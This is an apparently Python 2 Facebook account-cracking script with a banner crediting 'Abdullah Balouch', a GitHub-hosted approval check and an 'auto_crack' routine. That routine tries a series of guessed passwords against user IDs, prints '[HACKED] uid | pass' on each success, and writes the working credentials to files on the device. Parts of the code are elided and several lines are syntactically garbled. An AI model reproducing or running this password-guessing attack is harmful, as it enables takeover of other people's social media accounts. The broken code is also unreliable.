...
__author__ = 'abdullah'
__copyright = 'All rights reserved . Copyright  abdullah'
...
\033[1;96m   _    _         _       _ _       _\033[1;97m
\033[1;96m   / \  | |__   __| |_   _| | | __ _| |_\033[1;97m
\033[1;96m  / _ \ | '_ \ / _` | | | | | |/ _` | '_ \\033[1;97m
\033[1;96m / ___ \| |_) | (_| | |_| | | | (_| | | | |\033[1;97m
\033[1;96m/_/   \_\_.__/ \__,_|\__,_|_|_|\__,_|_| |_|\033[1;97m


\033[1;96m(~)\033[1;97m Author : Abdullah Balouch

\033[1;96m(~)\033[1;97m Github : https://github.com/Abdullah7

\033[1;96m(~)\033[1;97m Fb     : https://www.facebook.com/BALoCH BHAI
                           
            USE AIRPLANE MODE EVERY 6 MINT
\033[1;97m-----------------------------------------------
"""
...
def reg():
    ...
    print logo
    print ''
    print '\x1b[1;31;1mpehle approved lelo'
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.baloch.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/Abdullah-Baloch7/ABDULLAH-BALOCH /main/server.txt').text
    if to in r:
        ...
        os.system('xdg-open  https://('xdg-open https://.wa.me/+923496519800')
        reg()
...
def log_menu_s():
    s = raw_input(' \x1b[1;93m\xe2\x95\xb0\xe2\x94\x80BALOCH\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def menu_s():
    ms = raw_input('\x1b[1;92m\xe2\x95\xb0\xe2\x94\x80BALOCH\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('clear')
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;93m\xe2\x95\xb0\xe2\x94\x80WAQAS\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
    ...
    print ''
    print 47 * '-'
    print '\t\x1b[1;32m [BALOUCH]\x1b[0;97m'
    print 47 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[HACKED] ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[HACKED] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/BALOCH_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[HACKED] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/'BALOCH_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[HACKED] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/BALOCH_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[HACKED] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/ids/BALOCH_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[HACKED] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/ids/BALOCH_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[HACKED] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/ids/BALOCH_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;93m[CP] ' + uid + ' | ' + pass7
                                        cp = open('BALOCH_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[HACKED] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/ids/BALOCH_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;93m[CP] ' + uid + ' | ' + pass8
                                            cp = open('BALOCH.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
